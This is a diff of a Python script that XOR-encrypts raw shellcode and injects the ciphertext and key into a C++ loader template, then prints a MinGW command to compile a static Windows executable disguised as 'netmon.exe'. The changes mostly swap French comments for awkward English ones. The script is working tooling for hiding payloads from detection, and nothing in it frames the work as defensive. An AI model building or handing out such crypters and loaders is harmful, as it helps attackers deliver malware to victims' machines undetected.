@@ -1,17 +1,4 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-xor_crypt_replacer_v1.py
 
-Chiffre (XOR multi-octets) un shellcode brut puis l'injecte, avec la cle,
-dans un template de loader C++ afin de produire un .cpp pret a compiler.
-
-Usage (identique a la doc) :
-  python3 xor_crypt_replacer_v1.py <shellcode.bin> <shellcode_enc.bin> \
-      -p auto \
-      -k loader <template_loader.cpp> \
-      -addedshellcode-loader <sortie.cpp>
-"""
 
 import argparse
 import os
@@ -24,9 +11,8 @@ KEY_MARKER       = "/* @@XORKEY@@ */"
 DEFAULT_KEY_LEN  = 20
 
 
-# ----------------------------------------------------------------------
 # Helpers
-# ----------------------------------------------------------------------
+
 def gen_key(length: int = DEFAULT_KEY_LEN) -> bytes:
     """Cle XOR aleatoire cryptographiquement sure."""
     return secrets.token_bytes(length)
@@ -81,10 +67,10 @@ def main():
                     help="chemin du .cpp de sortie")
     args = ap.parse_args()
 
-    # Le "loader" litteral present dans la doc est un label : on prend le dernier chemin
+    # wetake the last path
     template_path = args.loader[-1]
 
-    # 1. Lecture du shellcode
+    # 1. read of the shellcode
     try:
         with open(args.shellcode, "rb") as f:
             shellcode = f.read()
@@ -93,24 +79,24 @@ def main():
 
     print("[+] Shellcode lu : %d octets" % len(shellcode))
 
-    # 2. Cle XOR
+    # 2. XOR key
     key = parse_key(args.key)
     print("[+] Cle XOR (%d octets) : %s" % (len(key), key.hex()))
 
-    # 3. Chiffrement
+    # 3. encryption
     encrypted = xor_crypt(shellcode, key)
     with open(args.encrypted, "wb") as f:
         f.write(encrypted)
     print("[+] Shellcode chiffre ecrit -> %s" % args.encrypted)
 
-    # 4. Lecture du template
+    # 4. read of the template
     try:
         with open(template_path, "r", encoding="utf-8") as f:
             template = f.read()
     except OSError as e:
         raise SystemExit("[!] Lecture impossible du template %s : %s" % (template_path, e))
 
-    # 5. Injection shellcode + cle
+    # 5. Injection of the shellcode + key
     template, idx = inject(template, SHELLCODE_MARKER, encrypted)
     print("[+] Found placeholder at index: %d" % idx)
 
@@ -121,7 +107,7 @@ def main():
     print(to_c_array(key))
     print("    };")
 
-    # 6. Ecriture du loader
+    # 6. writing from the loader
     out_dir = os.path.dirname(os.path.abspath(args.output))
     if out_dir:
         os.makedirs(out_dir, exist_ok=True)
@@ -129,7 +115,7 @@ def main():
         f.write(template)
     print("[+] Loader ecrit -> %s" % args.output)
 
-    # 7. Rappel de la commande de compilation
+    # 7. simple recall for the compiling command
     print("[+] Compiler avec :")
     print("    x86_64-w64-mingw32-g++ -O2 -static -o netmon.exe \"%s\"" % args.output)
 
